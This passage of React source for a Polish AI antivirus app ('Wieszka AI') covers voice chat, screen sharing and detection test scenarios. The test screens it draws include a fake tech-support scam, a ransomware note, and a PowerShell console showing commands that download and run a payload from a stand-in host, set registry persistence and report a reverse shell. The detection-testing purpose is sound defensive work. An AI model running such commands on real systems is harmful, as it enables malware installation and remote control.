      ctx.fillRect(140, 100, 1000, 520);
      ctx.strokeStyle = '#D9534F';
      ctx.lineWidth = 6;
      ctx.strokeRect(140, 100, 1000, 520);

      ctx.fillStyle = '#C9302C';
      ctx.font = 'bold 36px Arial, sans-serif';
      ctx.fillText('CRITICAL ALERT: WINDOWS DEFENDER SYSTEM LOCK', 180, 170);

      ctx.fillStyle = '#111111';
      ctx.font = '20px Arial, sans-serif';
      ctx.fillText('Wykryto złośliwego konia trojańskiego: Trojan.Spy.Banker.v3.2', 180, 230);
      ctx.fillText('Dostęp do Twojego komputera został zablokowany ze względów bezpieczeństwa.', 180, 265);
      ctx.fillText('Twoje hasła bankowe, zdjęcia i dane osobowe są przesyłane na serwer zewnętrzny.', 180, 300);

      ctx.fillStyle = '#C9302C';
      ctx.font = 'bold 28px Arial, sans-serif';
      ctx.fillText('Zadzwoń natychmiast do wsparcia Windows: +48 800-999-888', 180, 370);

      ctx.fillStyle = '#444444';
      ctx.font = '16px monospace';
      ctx.fillText('Kod błędu: #0x80070422-VIRUS_DETECTED', 180, 430);
      ctx.fillText('NIE RESTARTUJ ANI NIE WYŁĄCZAJ KOMPUTERA! Ryzyko utraty danych.', 180, 460);

      ctx.fillStyle = '#0078D7';
      ctx.fillRect(180, 510, 260, 50);
      ctx.fillStyle = '#FFFFFF';
      ctx.font = 'bold 18px Arial';
      ctx.fillText('Zadzwoń do pomocy technicznej', 195, 542);
    } else if (type === 'ransomware') {
      ctx.fillStyle = '#1A0000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = '#FF2222';
      ctx.font = 'bold 44px Arial, sans-serif';
      ctx.fillText('WSZYSTKIE TWOJE PLIKI ZOSTAŁY ZASZYFROWANE!', 100, 120);

      ctx.fillStyle = '#EEEEEE';
      ctx.font = '22px Arial, sans-serif';
      ctx.fillText('Dokumenty, zdjęcia, bazy danych zostały zablokowane kluczem RSA-4096.', 100, 190);
      ctx.fillText('Oryginalny klucz prywatny znajduje się na naszym tajnym serwerze TOR.', 100, 230);

      ctx.fillStyle = '#FFDD44';
      ctx.font = 'bold 30px monospace';
      ctx.fillText('Czas na zapłatę okupu: 47:59:12', 100, 320);

      ctx.fillStyle = '#CCCCCC';
      ctx.font = '18px monospace';
      ctx.fillText('Wyślij 0.05 BTC na adres: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', 100, 390);

      ctx.fillStyle = '#888888';
      ctx.font = '16px Arial';
      ctx.fillText('Próba odzyskania danych programami zewnętrznymi spowoduje trwałe zniszczenie plików.', 100, 460);
    } else {
      ctx.fillStyle = '#0C0C0C';
      ctx.fillRect(0, 0, canvas.width, canvas.height);

      ctx.fillStyle = '#CCCCCC';
      ctx.font = '18px Consolas, monospace';
      ctx.fillText('Windows PowerShell (Admin Mode)', 50, 60);
      ctx.fillText('Copyright (C) Microsoft Corporation. All rights reserved.', 50, 95);

      ctx.fillStyle = '#FF5555';
      ctx.fillText('PS C:\\Users\\Administrator> powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -nop', 50, 160);
      ctx.fillText('>> (New-Object Net.WebClient).DownloadFile("http://evil-server-payload.ru/loader.exe", "$env:APPDATA\\svchost32.exe")', 50, 200);
      ctx.fillText('>> Start-Process "$env:APPDATA\\svchost32.exe" -ArgumentList "/silent"', 50, 240);
      ctx.fillText('>> reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "UpdateTask" /t REG_SZ /d "$env:APPDATA\\svchost32.exe" /f', 50, 280);

      ctx.fillStyle = '#55FF55';
      ctx.fillText('[+] Status: Payload downloaded successfully (2,492 KB)', 50, 350);
      ctx.fillText('[+] Status: Registry persistence established.', 50, 390);
      ctx.fillText('[!] Warning: Remote reverse shell connected to 185.220.101.4:4444', 50, 430);
    }

    const dataUrl = canvas.toDataURL('image/jpeg', 0.65);
    setCurrentSnapshot(dataUrl);
    setShowScreenPanel(true);
    setScreenError(null);
    setIsLiveWatching(true);

    // Stop speaking old things and immediately let Wieszka AI react to the new screen out loud!
    stopSpeaking();

    // Trigger immediate autonomous analysis and speech
    setTimeout(() => {
      performLiveScreenTick(dataUrl, true);
    }, 150);
  };

  // Upload user's custom screenshot file
  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      const dataUrl = event.target?.result as string;
      if (dataUrl) {
        setCurrentSnapshot(dataUrl);
        setShowScreenPanel(true);
        setScreenError(null);
        setIsLiveWatching(true);
        stopSpeaking();

        // Immediately trigger live inspection and voice
        setTimeout(() => {
          performLiveScreenTick(dataUrl, true);
        }, 150);
      }
    };
    reader.readAsDataURL(file);
  };

  const toggleSpeechRecognition = () => {
    if (!recognitionRef.current) return;
    if (restartTimerRef.current) {
      clearTimeout(restartTimerRef.current);
      restartTimerRef.current = null;
    }
    if (isListening) {
      handsFreeActiveRef.current = false;
      setIsHandsFreeVoice(false);
      try {
        recognitionRef.current.stop();
      } catch (e) {}
      setIsListening(false);
    } else {
      handsFreeActiveRef.current = true;
      setIsHandsFreeVoice(true);
      try {
        recognitionRef.current.start();
        setIsListening(true);
      } catch (err) {
        console.warn('Could not start speech recognition:', err);
      }
    }
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isLoading, isSpeaking]);

  const handleCopyText = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleDownloadTranscript = () => {
    const fullTranscript =
      `=== TRANSKRYPCJA ROZMOWY GŁOSOWEJ I WIDZENIA EKRANU Z WIESZKA AI ===\nData: ${new Date().toLocaleString()}\nAntywirus: Wieszka Antivirus Ultimate\nSilnik: Wieszka AI Live Voice & Multimodal Vision\n\n` +
      messages
        .map(
          (m) =>
            `[${m.timestamp}] ${m.sender === 'user' ? 'UŻYTKOWNIK' : 'WIESZKA AI'}:\n${m.text}\n`
        )
        .join('\n----------------------------------------\n\n');

    const blob = new Blob([fullTranscript], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `Wieszka_AI_Rozmowa_${new Date().toISOString().slice(0, 10)}.txt`;
    link.click();
    URL.revokeObjectURL(url);
  };

  const handleClearHistory = () => {
    stopSpeaking();
    setMessages([
      {
        id: 'welcome-reset',
        sender: 'ai',
        text: getText(
          currentLang,
          'Rozmowa została zresetowana. Jestem gotowy do dalszej dyskusji. Udostępnij ekran lub mów do mikrofonu.',
          'Chat history has been cleared. I am ready. Share screen or speak into the microphone.'
        ),
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      },
    ]);
  };

  return (
    <div className="p-8 space-y-6 max-w-7xl mx-auto select-none">
      {/* Hidden offscreen canvas for frame capture */}
      <canvas ref={canvasRef} className="hidden" />

      {/* Hidden file input for screenshot upload */}
      <input
        ref={fileInputRef}
        type="file"
        accept="image/*"
        onChange={handleFileUpload}
        className="hidden"
      />

      {/* TOP BANNER: Rozmawiaj z Wieszka AI na żywo (Głos + Obserwacja Ekranu) */}
      <div className="bg-[#121217] p-6 rounded-3xl border border-slate-800 flex flex-col md:flex-row items-start md:items-center justify-between gap-6 shadow-xl relative overflow-hidden">
        <div className="space-y-2">
          <div className="inline-flex items-center space-x-2 px-3 py-1 rounded-full text-xs font-mono bg-indigo-600/20 text-indigo-300 border border-indigo-500/30">
            <AudioLines className="w-3.5 h-3.5 text-indigo-400 animate-pulse" />
            <span className="font-bold">
              {getText(
                currentLang,
                'Wieszka AI • Czat Głosowy Na Żywo & Autonomiczny Podgląd Ekranu',
                'Wieszka AI • Live Voice Chat & Autonomous Screen Vision'
              )}
            </span>
          </div>

          <h2 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 flex-wrap">
            <span>{getText(currentLang, 'Rozmawiaj z Wieszka AI', 'Chat with Wieszka AI')}</span>
            <span className="text-xs bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 px-2.5 py-0.5 rounded-full font-mono font-bold flex items-center gap-1.5">
              <Volume2 className="w-3.5 h-3.5 text-indigo-400" />
              {getText(currentLang, 'MÓWI DO CIEBIE GŁOSEM', 'VOICE RESPONSES ENABLED')}
            </span>
            {isScreenSharing && (
              <span className="text-xs bg-rose-500/20 text-rose-300 border border-rose-500/40 px-2.5 py-0.5 rounded-full font-mono font-bold flex items-center gap-1.5 animate-pulse">
                <span className="w-2 h-2 rounded-full bg-rose-500" />
                {getText(currentLang, 'EKRAN NA ŻYWO', 'LIVE SCREEN')}
              </span>
            )}
          </h2>

          <p className="text-xs text-slate-400 max-w-2xl leading-relaxed">
            {getText(
              currentLang,
              'Wieszka AI mówi do Ciebie na głos, a gdy udostępnisz ekran – obserwuje go w czasie rzeczywistym i automatycznie ostrzega Cię głosem o każdym wirusie, zablokowanym oknie lub fałszywym alercie. Mów swobodnie – mikrofon działa w trybie głośnomówiącym.',
              'Wieszka AI talks to you out loud, and when you share your screen – continuously watches it in real time and automatically speaks out warnings about viruses, lockouts, or fake alerts.'
            )}
          </p>
        </div>

        {/* Action Controls in Header */}
        <div className="flex flex-wrap items-center gap-2.5 shrink-0">
          {/* Main Screen Share Toggle Button */}
          {!isScreenSharing ? (
            <button
              onClick={startScreenShare}
              className="px-4 py-2.5 rounded-xl text-xs font-bold bg-indigo-600 hover:bg-indigo-500 text-white transition flex items-center space-x-2 shadow-lg shadow-indigo-900/40 group"
              title={getText(currentLang, 'Udostępnij swój ekran dla Wieszka AI', 'Share screen with Wieszka AI')}
            >
              <MonitorUp className="w-4 h-4 text-indigo-200 group-hover:scale-110 transition" />
              <span>{getText(currentLang, 'Udostępnij Ekran', 'Share Screen')}</span>
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
            </button>
          ) : (
            <button
              onClick={stopScreenShare}
              className="px-4 py-2.5 rounded-xl text-xs font-bold bg-rose-600 hover:bg-rose-500 text-white transition flex items-center space-x-2 shadow-lg shadow-rose-900/40"
              title={getText(currentLang, 'Zatrzymaj udostępnianie ekranu', 'Stop screen sharing')}
            >
              <MonitorOff className="w-4 h-4" />
              <span>{getText(currentLang, 'Zatrzymaj Ekran', 'Stop Screen')}</span>
            </button>
          )}

          {/* Toggle Screen Panel View */}
          <button
            onClick={() => setShowScreenPanel(!showScreenPanel)}
            className={`px-3.5 py-2 rounded-xl text-xs font-semibold border transition flex items-center space-x-1.5 ${
              showScreenPanel
                ? 'bg-indigo-600/30 text-indigo-300 border-indigo-500/40'
                : 'bg-[#1A1A21] text-slate-400 hover:text-slate-200 border-slate-800'
            }`}
            title={getText(currentLang, 'Pokaż/ukryj panel ekranu Wieszka AI', 'Toggle screen vision panel')}
          >
            <Eye className="w-4 h-4 text-indigo-400" />
            <span>{getText(currentLang, 'Panel Ekranu', 'Screen Panel')}</span>
          </button>

          {/* Hands-Free Voice Mode Toggle */}
          {speechSupported && (
            <button
              onClick={toggleSpeechRecognition}
              className={`px-3.5 py-2 rounded-xl text-xs font-semibold border transition flex items-center space-x-2 ${
                isListening
                  ? 'bg-emerald-600/30 text-emerald-300 border-emerald-500/50 shadow-md shadow-emerald-950/30'
                  : 'bg-[#1A1A21] text-slate-400 hover:text-slate-200 border-slate-800'
              }`}
              title={isListening ? getText(currentLang, 'Wyłącz nasłuch mikrofonu', 'Disable microphone') : getText(currentLang, 'Włącz nasłuch mikrofonu (mów do Wieszka AI)', 'Enable microphone (speak to Wieszka AI)')}
            >
              <Mic className={`w-4 h-4 ${isListening ? 'text-emerald-400 animate-pulse' : 'text-slate-400'}`} />
              <span>{isListening ? getText(currentLang, 'Mikrofon: Włączony', 'Mic: ON') : getText(currentLang, 'Mikrofon: Wyłączony', 'Mic: OFF')}</span>
            </button>
          )}

          {/* Quick Voice Switcher Tabs (Young Male / Young Female) */}
          <div className="flex items-center bg-[#121217] p-1 rounded-xl border border-slate-800 space-x-1">
            <button
              onClick={() => {
                handleSelectPreset('young_male');
                speakText('Włączono młody głos męski.', 'young_male');
              }}
              title="Przełącz na naturalny młody głos męski (Kuba)"
              className={`px-2.5 py-1 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 ${
                selectedPresetId === 'young_male'
                  ? 'bg-indigo-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
              }`}
            >
              <span>👦</span>
              <span>{getText(currentLang, 'Młody Męski', 'Young Male')}</span>
            </button>
            <button
              onClick={() => {
                handleSelectPreset('young_female');
                speakText('Włączono młody głos żeński.', 'young_female');
              }}
              title="Przełącz na naturalny młody głos żeński (Maja)"
              className={`px-2.5 py-1 rounded-lg text-xs font-bold transition flex items-center space-x-1.5 ${
                selectedPresetId === 'young_female'
                  ? 'bg-pink-600 text-white shadow-md'
                  : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/60'
              }`}
            >
              <span>👧</span>
              <span>{getText(currentLang, 'Młody Żeński', 'Young Female')}</span>
            </button>
          </div>

          {/* Gemini Voice Selection Dropdown */}
          <div className="relative" ref={voicePickerRef}>
            <button
              onClick={() => setShowVoicePicker(!showVoicePicker)}
              title={getText(currentLang, 'Wszystkie profile głosowe Wieszka AI', 'All AI Voice Profiles')}
              className="px-3 py-2 rounded-xl text-xs font-semibold bg-[#1A1A21] hover:bg-slate-800 text-slate-200 border border-slate-800 transition flex items-center space-x-1.5"
            >
              <Volume1 className="w-3.5 h-3.5 text-indigo-400" />
              <ChevronDown className={`w-3.5 h-3.5 text-slate-400 transition-transform ${showVoicePicker ? 'rotate-180' : ''}`} />
            </button>

            {showVoicePicker && (
              <div className="absolute right-0 mt-2 w-80 sm:w-96 bg-[#16161D] border border-slate-700/80 rounded-2xl shadow-2xl z-50 p-3.5 backdrop-blur-xl space-y-3">
                <div className="flex items-center justify-between pb-2 border-b border-slate-800">
                  <div className="flex items-center space-x-2">
                    <Sparkles className="w-4 h-4 text-indigo-400" />
                    <span className="text-xs font-bold text-slate-100">
                      {getText(currentLang, 'Profile Głosowe Wieszka AI', 'Wieszka AI Voice Profiles')}
                    </span>
                  </div>
                  <span className="text-[10px] px-2 py-0.5 rounded-full bg-indigo-950 text-indigo-300 border border-indigo-800/60 font-mono font-semibold">
                    {getText(currentLang, '6 unikalnych barw', '6 unique voices')}
                  </span>
                </div>

                <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
                  {GEMINI_VOICE_PRESETS.map((preset) => {
                    const samplePhrases: Record<string, string> = {
                      young_male: 'Cześć! Jestem Kuba. Mam młody i naturalny męski głos bez robotycznych zniekształceń.',
                      young_female: 'Hej! Jestem Maja. Zawsze z uśmiechem i spokojem pomogę Ci zadbać o bezpieczeństwo.',
                      natural_male: 'Dzień dobry. Jestem Marek, Twój opanowany doradca do spraw cyberbezpieczeństwa.',
                      natural_female: 'Witaj! Jestem Paulina. Tarcze ochronne Wieszka AI czuwają nad Twoim komputerem.',
                      puck: 'Cześć! Jestem Puck, Twój bystry i szybki pomocnik.',
                      aoede: 'Dzień dobry. Jestem Zofia, serdecznie gotowa do pomocy.',
                    };

                    const sampleText = samplePhrases[preset.id] || 'Cześć, tak brzmi mój naturalny głos!';

                    return (
                      <div
                        key={preset.id}
                        className={`p-2.5 rounded-xl border transition flex items-center justify-between gap-2 ${
                          selectedPresetId === preset.id
                            ? 'bg-indigo-600/20 border-indigo-500/70 text-white shadow-sm ring-1 ring-indigo-500/50'
                            : 'bg-[#121217] hover:bg-slate-800/70 text-slate-300 border-slate-800'
                        }`}
                      >
                        <button
                          type="button"
                          onClick={() => {
                            handleSelectPreset(preset.id);
                            setShowVoicePicker(false);
                            speakText(sampleText, preset.id);
                          }}
                          className="text-left flex-1 min-w-0"
                        >
                          <div className="flex items-center space-x-2">
                            <span className="text-xs font-bold text-slate-100">{preset.name}</span>
                            <span
                              className={`text-[9px] px-1.5 py-0.2 rounded font-mono font-medium ${
                                preset.gender === 'female'
                                  ? 'bg-pink-950/80 text-pink-300 border border-pink-800/40'
                                  : preset.gender === 'young'
                                  ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-800/40'
                                  : 'bg-indigo-950/80 text-indigo-300 border border-indigo-800/40'
                              }`}
                            >
                              {preset.gender === 'female' ? 'Kobiecy' : preset.gender === 'young' ? 'Młody' : 'Męski'}
                            </span>
                          </div>
                          <p className="text-[10px] text-slate-400 line-clamp-1 mt-0.5">{preset.desc}</p>
                        </button>

                        <div className="flex items-center space-x-1 shrink-0">
                          <button
                            type="button"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleSelectPreset(preset.id);
                              speakText(sampleText, preset.id);
                            }}
                            title="Odsłuchaj próbkę tego głosu"
                            className="p-1.5 rounded-lg bg-[#1A1A21] hover:bg-indigo-600 text-slate-300 hover:text-white transition border border-slate-700"
                          >
                            <Volume2 className="w-3.5 h-3.5" />
                          </button>
                          {selectedPresetId === preset.id && (
                            <div className="w-5 h-5 rounded-full bg-indigo-600 flex items-center justify-center text-white">
                              <Check className="w-3 h-3" />
                            </div>
                          )}
                        </div>
                      </div>
                    );
                  })}
                </div>

                {availableVoices.length > 0 && (
                  <div className="pt-2 border-t border-slate-800 space-y-1.5">
                    <div className="flex items-center justify-between">
                      <label className="text-[10px] text-slate-400 font-medium">Syntezator mowy systemu:</label>
                      <span className="text-[9px] text-slate-500 font-mono">{availableVoices.length} zainstalowanych</span>
                    </div>
                    <select
                      value={selectedVoice?.voiceURI || ''}
                      onChange={(e) => {
                        const voice = availableVoices.find((v) => v.voiceURI === e.target.value);
                        if (voice) {
                          setSelectedVoice(voice);
                          speakText('Wybrano ten syntezator mowy urządzenia.');
                        }
                      }}
                      className="w-full bg-[#111116] border border-slate-800 rounded-lg px-2 py-1.5 text-[11px] text-slate-300 focus:outline-none focus:border-indigo-500"
                    >
                      {availableVoices.map((v) => (
                        <option key={v.voiceURI} value={v.voiceURI}>
                          {v.name} ({v.lang})
                        </option>
                      ))}
                    </select>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Auto-read toggle */}
          <button
            onClick={() => {
              if (autoSpeak) stopSpeaking();
              setAutoSpeak(!autoSpeak);
            }}
            title={autoSpeak ? 'Wyłącz automatyczne mówienie AI na głos' : 'Włącz mówienie AI na głos'}
            className={`px-3.5 py-2 rounded-xl text-xs font-semibold border transition flex items-center space-x-2 ${
              autoSpeak
                ? 'bg-indigo-600 text-white border-indigo-500 shadow-md shadow-indigo-900/30'
                : 'bg-[#1A1A21] text-slate-400 hover:text-slate-200 border-slate-800'
            }`}
          >
            {autoSpeak ? <Volume2 className="w-4 h-4 text-white" /> : <VolumeX className="w-4 h-4 text-slate-400" />}
            <span className="hidden sm:inline">Głos AI</span>
          </button>

          {/* Download Transcript */}
          <button
            onClick={handleDownloadTranscript}
            title="Pobierz transkrypcję rozmowy do pliku tekstowego"
            className="px-3.5 py-2 rounded-xl text-xs font-semibold bg-[#1A1A21] hover:bg-slate-800 text-slate-300 border border-slate-800 transition flex items-center space-x-1.5"
          >
            <Download className="w-4 h-4 text-slate-400" />
            <span className="hidden lg:inline">Zapisz</span>
          </button>

          {/* Clear */}
          <button
            onClick={handleClearHistory}
            className="px-3.5 py-2 rounded-xl text-xs font-semibold bg-[#1A1A21] hover:bg-rose-500/20 hover:text-rose-300 text-slate-400 border border-slate-800 transition flex items-center space-x-1.5"
            title="Wyczyść całą historię rozmowy"
          >
            <Trash2 className="w-4 h-4" />
            <span>Reset</span>
          </button>
        </div>
      </div>

      {/* ACTIVE VOICE WAVEFORM BANNER: Appears when Wieszka AI is speaking aloud */}
      {isSpeaking && (
        <div className="p-4 rounded-2xl bg-gradient-to-r from-indigo-900/50 via-purple-900/40 to-indigo-950/60 border border-indigo-500/50 shadow-xl flex items-center justify-between gap-4 animate-in fade-in duration-200">
          <div className="flex items-center space-x-3 min-w-0">
            <div className="w-10 h-10 rounded-2xl bg-indigo-600 flex items-center justify-center shrink-0 shadow-lg shadow-indigo-900/50 animate-pulse">
              <AudioLines className="w-5 h-5 text-white" />
            </div>
            <div className="space-y-1 min-w-0">
              <div className="flex items-center space-x-2">
                <span className="text-xs font-bold text-white uppercase tracking-wider font-mono flex items-center gap-1.5">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  {getText(currentLang, 'Wieszka AI Mówi do Ciebie Na Głos:', 'Wieszka AI Speaking Out Loud:')}
                </span>
              </div>
              <p className="text-xs text-indigo-200 truncate max-w-2xl italic">
                "{activeSpeechText}"
              </p>
            </div>
          </div>

          {/* Wave animation bars + Stop Speaking Button */}
          <div className="flex items-center space-x-3 shrink-0">
            <div className="hidden sm:flex items-center space-x-1 h-6 px-3 bg-black/40 rounded-xl border border-indigo-500/30">
              <span className="w-1 bg-indigo-400 rounded-full animate-bounce h-3" />
              <span className="w-1 bg-indigo-300 rounded-full animate-bounce h-5" style={{ animationDelay: '0.15s' }} />
              <span className="w-1 bg-indigo-200 rounded-full animate-bounce h-4" style={{ animationDelay: '0.3s' }} />
              <span className="w-1 bg-indigo-400 rounded-full animate-bounce h-6" style={{ animationDelay: '0.2s' }} />
              <span className="w-1 bg-indigo-300 rounded-full animate-bounce h-3" style={{ animationDelay: '0.35s' }} />
            </div>

            <button
              onClick={stopSpeaking}
              className="px-3 py-1.5 rounded-xl text-xs font-semibold bg-rose-600/80 hover:bg-rose-500 text-white transition flex items-center gap-1.5 shadow"
              title={getText(currentLang, 'Przerwij wypowiedź głosową', 'Stop speaking')}
            >
              <VolumeX className="w-3.5 h-3.5" />
              <span>{getText(currentLang, 'Przerwij mowę', 'Stop')}</span>
            </button>
          </div>
        </div>
      )}

      {/* Screen Sharing & Autonomous Visual Watcher Panel */}
      {showScreenPanel && (
        <div className="bg-[#121217] border border-indigo-500/40 rounded-3xl p-6 shadow-2xl space-y-5 animate-in fade-in slide-in-from-top-4 duration-300">
          {/* Header of Screen Inspector */}
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 border-b border-slate-800/80 pb-4">
            <div className="flex items-center space-x-3">
              <div className="p-2.5 rounded-2xl bg-indigo-600/20 text-indigo-400 border border-indigo-500/30">
                <Monitor className="w-5 h-5" />
              </div>
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <span>{getText(currentLang, 'Wieszka AI Vision • Autonomiczny Obserwator Ekranu Na Żywo', 'Wieszka AI Vision • Autonomous Live Screen Watcher')}</span>
                  {isScreenSharing ? (
                    <span className="px-2 py-0.5 rounded-full text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                      {getText(currentLang, 'STRUMIEŃ NA ŻYWO', 'LIVE STREAM')}
                    </span>
                  ) : currentSnapshot ? (
                    <span className="px-2 py-0.5 rounded-full text-[10px] font-mono font-bold bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                      {getText(currentLang, 'KADR PRZECHWYCONY', 'FRAME CAPTURED')}
                    </span>
                  ) : (
                    <span className="px-2 py-0.5 rounded-full text-[10px] font-mono font-bold bg-slate-800 text-slate-400 border border-slate-700">
                      {getText(currentLang, 'OCZEKIWANIE NA EKRAN', 'AWAITING SCREEN')}
                    </span>
                  )}
                </h3>
                <p className="text-xs text-slate-400">
                  {getText(
                    currentLang,
                    'Wieszka AI sam na bieżąco analizuje Twój pulpit i natychmiast mówi do Ciebie, gdy zauważy wirusa, błąd lub niebezpieczne okno – bez Twojej ingerencji!',
                    'Wieszka AI autonomously analyzes your screen in real time and immediately warns you out loud whenever malware, lockups or suspicious windows appear!'
                  )}
                </p>
              </div>
            </div>

            {/* Quick Action Tools for Screen */}
            <div className="flex flex-wrap items-center gap-2">
              {/* Toggle Autonomous Live Watching */}
              <button
                onClick={() => setIsLiveWatching(!isLiveWatching)}
                className={`px-3.5 py-2 rounded-xl text-xs font-semibold border transition flex items-center gap-1.5 ${
                  isLiveWatching
                    ? 'bg-emerald-600/20 text-emerald-300 border-emerald-500/40'
                    : 'bg-[#1A1A21] text-slate-400 border-slate-800'
                }`}
                title={getText(currentLang, 'Włącz lub wstrzymaj automatyczne sprawdzanie ekranu', 'Toggle automatic screen inspection')}
              >
                {isLiveWatching ? <Play className="w-3.5 h-3.5 text-emerald-400" /> : <Pause className="w-3.5 h-3.5 text-slate-400" />}
                <span>
                  {isLiveWatching
                    ? `${getText(currentLang, 'Obserwacja aktywna', 'Watching active')} (${liveCountdown}s)`
                    : getText(currentLang, 'Obserwacja wstrzymana', 'Watching paused')}
                </span>
              </button>

              <button
                onClick={() => performLiveScreenTick(undefined, true)}
                disabled={isCheckingLiveScreen || (!isScreenSharing && !currentSnapshot)}
                className="px-4 py-2 rounded-xl text-xs font-bold bg-indigo-600 hover:bg-indigo-500 text-white disabled:opacity-50 disabled:cursor-not-allowed transition flex items-center gap-2 shadow-md shadow-indigo-950/40"
                title={getText(currentLang, 'Wymuś natychmiastową diagnozę na głos', 'Force immediate spoken diagnosis')}
              >
                {isCheckingLiveScreen ? (
                  <Loader2 className="w-3.5 h-3.5 animate-spin" />
                ) : (
                  <Activity className="w-3.5 h-3.5 text-indigo-200" />
                )}
                <span>{getText(currentLang, 'Sprawdź teraz na głos', 'Check now out loud')}</span>
              </button>

              <button
                onClick={() => fileInputRef.current?.click()}
                className="px-3.5 py-2 rounded-xl text-xs font-semibold bg-[#1A1A21] hover:bg-slate-800 text-slate-300 border border-slate-800 transition flex items-center gap-1.5"
                title={getText(currentLang, 'Wgraj zrzut ekranu z pliku', 'Upload screenshot from file')}
              >
                <Upload className="w-3.5 h-3.5 text-slate-400" />
                <span>{getText(currentLang, 'Wgraj zrzut', 'Upload screenshot')}</span>
              </button>

              <button
                onClick={() => setShowScreenPanel(false)}
                className="p-2 rounded-xl text-slate-400 hover:text-white hover:bg-slate-800 transition"
                title={getText(currentLang, 'Zwiń panel podglądu ekranu', 'Collapse screen panel')}
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>

          {/* Screen Error Notification */}
          {screenError && (
            <div className="p-4 rounded-2xl bg-amber-500/10 border border-amber-500/30 text-amber-200 text-xs flex items-start gap-3">
              <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
              <div className="space-y-1">
                <p className="font-semibold">{screenError}</p>
                <p className="text-slate-400 text-[11px]">
                  {getText(
                    currentLang,
                    'Możesz kliknąć dowolny z poniższych scenariuszy testowych – Wieszka AI od razu zobaczy spreparowanego wirusa i przemówi do Ciebie na głos!',
                    'You can click any of the test scenarios below – Wieszka AI will detect simulated threats and speak to you out loud!'
                  )}
                </p>
              </div>
            </div>
          )}

          {/* Real-time Status Strip */}
          <div className="p-3.5 rounded-2xl bg-[#0D0D12] border border-slate-800 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div className="flex items-center space-x-3">
              <div className="flex items-center space-x-1.5">
                <span className={`w-2.5 h-2.5 rounded-full ${isCheckingLiveScreen ? 'bg-indigo-400 animate-ping' : isLiveWatching ? 'bg-emerald-400' : 'bg-slate-500'}`} />
                <span className="text-xs font-bold text-slate-200 font-mono">
                  STATUS: {isCheckingLiveScreen ? getText(currentLang, 'BŁYSKAWICZNA ANALIZA (1s)...', 'RAPID ANALYSIS (1s)...') : isLiveWatching ? getText(currentLang, 'AKTYWNY (Co 1s na bieżąco)', 'ACTIVE (Every 1s real-time)') : getText(currentLang, 'PAUZA', 'PAUSED')}
                </span>
              </div>
              <span
                className={`px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold uppercase ${
                  liveThreatStatus === 'KRYTYCZNY'
                    ? 'bg-rose-500 text-white animate-pulse'
                    : liveThreatStatus === 'ŚREDNI'
                    ? 'bg-amber-500 text-black font-bold'
                    : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                }`}
              >
                {liveThreatStatus === 'KRYTYCZNY' ? getText(currentLang, 'KRYTYCZNY', 'CRITICAL') : liveThreatStatus === 'ŚREDNI' ? getText(currentLang, 'ŚREDNI', 'MEDIUM') : getText(currentLang, 'BEZPIECZNY', 'SAFE')}
              </span>
            </div>

            {liveScreenSummary ? (
              <div className="text-[11px] text-slate-400 flex items-center gap-1.5 truncate max-w-md">
                <Eye className="w-3.5 h-3.5 text-indigo-400 shrink-0" />
                <span className="truncate">{getText(currentLang, 'Widok:', 'Vision:')} {liveScreenSummary}</span>
              </div>
            ) : lastLiveSpeech ? (
              <div className="text-[11px] text-indigo-300 italic flex items-center gap-1.5">
                <Volume2 className="w-3 h-3 text-indigo-400 shrink-0" />
                <span className="truncate max-w-md">{getText(currentLang, 'Ostatni alert:', 'Last alert:')} "{lastLiveSpeech}"</span>
              </div>
            ) : null}
          </div>

          {/* Video / Snapshot Display Viewport */}
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Screen Monitor Area */}
            <div className="lg:col-span-8 bg-[#0D0D12] rounded-2xl border border-slate-800 overflow-hidden relative min-h-[300px] flex items-center justify-center shadow-inner group">
              {isScreenSharing ? (
                <div className="relative w-full h-full">
                  <video
                    ref={videoRef}
                    autoPlay
                    playsInline
                    muted
                    className="w-full h-auto max-h-[420px] object-contain rounded-2xl mx-auto"
                  />
                  {/* Cyber Scanning HUD overlay */}
                  <div className="absolute inset-0 pointer-events-none border-2 border-indigo-500/30 rounded-2xl flex flex-col justify-between p-4">
                    <div className="flex items-center justify-between">
                      <div className="px-3 py-1 rounded-lg bg-[#121217]/80 backdrop-blur-md border border-indigo-500/40 text-[10px] font-mono text-indigo-300 flex items-center gap-2">
